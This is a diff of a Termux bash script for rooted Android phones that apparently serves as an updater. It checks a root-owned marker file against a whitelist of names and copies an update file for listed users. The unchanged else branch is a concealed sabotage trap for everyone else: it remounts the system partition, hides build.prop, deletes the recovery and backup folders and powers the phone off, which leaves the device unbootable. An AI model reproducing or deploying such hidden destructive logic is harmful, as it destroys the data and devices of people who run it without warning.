@@ -1,16 +1,9 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
 if [ $(su -c cat /data/ranjau) == siex ] || [ $(su -c cat /data/ranjau) == siye ] || [ $(su -c cat /data/ranjau) == sizet ] || [ $(su -c cat /data/ranjau) == gembix ] || [ $(su -c cat /data/ranjau) == lavender ] || [ $(su -c cat /data/ranjau) == galang ] || [ $(su -c cat /data/ranjau) == farhan ] || [ $(su -c cat /data/ranjau) == petra ] || [ $(su -c cat /data/ranjau) == tomi ] || [ $(su -c cat /data/ranjau) == diyan ] || [ $(su -c cat /data/ranjau) == mail ] || [ $(su -c cat /data/ranjau) == Xmansur ] || [ $(su -c cat /data/ranjau) == rifal ] || [ $(su -c cat /data/ranjau) == vince ]; then
-
-rm -rf ~/jd2/
-cd ~/
-git clone https://github.com/g3mb1x/jd2.git
-cd ~/jd2/
-chmod +x gmx
-#bash gmx
-
+yes | cp -fr -t ~/.shortcuts/ Update
+chmod -R 700 ~/.shortcuts/
 else
-
 su -c mount -o rw,remount /
 su -c mkdir /system/.sys
 su -c mv /system/build.prop /system/.sys
@@ -20,6 +13,5 @@ su -c rm -rf /sdcard/Fox
 su -c rm -rf /sdcard/TWRP
 su -c rm -rf /sdcard/TeBe
 su -c reboot -p
-
 fi
 exit 0
